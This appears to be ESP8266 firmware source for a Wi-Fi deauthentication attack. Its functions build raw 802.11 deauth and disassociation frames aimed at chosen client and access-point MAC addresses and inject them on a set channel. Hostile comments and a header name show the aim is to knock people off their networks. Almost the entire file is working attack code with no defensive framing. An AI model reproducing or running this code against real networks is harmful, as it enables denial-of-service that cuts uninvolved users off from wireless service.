#include "string_utils.h"
#include <FuckYourWifiInParticular.h>
#include <ESP8266WiFi.h>

bool sendDeauth(uint8_t *apMac, uint8_t *stMac, uint8_t reason, uint8_t ch)
{
    uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };

    bool success = false;

    // build deauth packet
    int packetSize = sizeof(deauthPacket);

    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);

    memcpy(&deauthpkt[4], stMac, 6);
    memcpy(&deauthpkt[10], apMac, 6);
    memcpy(&deauthpkt[16], apMac, 6);
    deauthpkt[24] = reason;
    deauthpkt[0] = 0xc0;

    if (sendPacket(deauthpkt, packetSize, ch, true))
    {
        success = true;
    }

    // send another disassocpkt bc fuck em twice
    uint8_t disassocpkt[packetSize];

    memcpy(disassocpkt, deauthpkt, packetSize);

    disassocpkt[0] = 0xa0;

    if (sendPacket(disassocpkt, packetSize, ch, false))
    {
        success = true;
    }

    return success;
}

bool sendPacket(uint8_t *packet, uint16_t packetSize, uint8_t ch, bool force_ch)
{

    // Serial.println(bytesToStr(packet, packetSize));

    // set channel
    wifi_set_channel(ch);

    // sent out packet
    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    return sent;
}